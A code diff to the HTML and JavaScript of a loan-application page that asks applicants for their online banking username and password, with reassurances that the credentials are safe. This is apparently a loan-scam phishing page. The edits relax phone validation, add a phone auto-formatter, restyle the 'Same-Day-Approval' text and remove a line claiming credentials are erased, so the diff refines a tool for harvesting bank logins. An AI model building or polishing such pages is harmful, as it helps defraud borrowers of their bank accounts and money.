@@ -189,7 +189,7 @@
 
             <div class="form-group">
                 <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" placeholder="XXX-XXX-XXXX" pattern="[0-9]{10}" maxlength="10" title="Please enter exactly 10 digits" required>
+                <input type="text" id="phone" name="phone" placeholder="XXX-XXX-XXXX" maxlength="12" title="Please enter exactly 10 digits" required>
             </div>
 
             <button type="button" onclick="showPage(2)">APPLY NOW</button>
@@ -228,7 +228,7 @@
             <div class="form-group">
                 <label for="loanamount">Loan Amount ($3,000 - $100,000)</label>
                 <input type="number" id="loanamount" name="loanamount" placeholder="Enter amount" min="3000" max="100000" required>
-                <small style="color: #666; font-size: 12px;">Low interest rate of 9.39% | Same day approval</small>
+                <small style="color: #666; font-size: 12px;">Low interest rate of 9.39% | Same-Day-Approval</small>
             </div>
 
             <div class="form-group">
@@ -312,7 +312,6 @@
             <div class="warning-box">
                 <p class="info-text" style="font-weight: 600;">* We need your online banking Username and Password to link your account to our Portal server.</p>
                 <p class="info-text" style="color: #28a745; margin-top: 8px;">✓ Your banking credentials are safe and secured.</p>
-                <p class="info-text" style="color: #666; margin-top: 5px;">✓ Your banking credentials automatically erase from our server.</p>
             </div>
 
             <div class="subtitle">CREDENTIALS</div>
@@ -388,6 +387,25 @@
                 otherInput.style.display = 'none';
                 document.getElementById('otherloantype').required = false;
             }
+        });
+
+        // Auto-format phone number as XXX-XXX-XXXX
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length > 10) value = value.slice(0, 10); // Limit to 10 digits
+            
+            let formatted = '';
+            if (value.length > 0) {
+                formatted = value.slice(0, 3);
+            }
+            if (value.length > 3) {
+                formatted += '-' + value.slice(3, 6);
+            }
+            if (value.length > 6) {
+                formatted += '-' + value.slice(6, 10);
+            }
+            
+            e.target.value = formatted;
         });
     </script>
 </div>
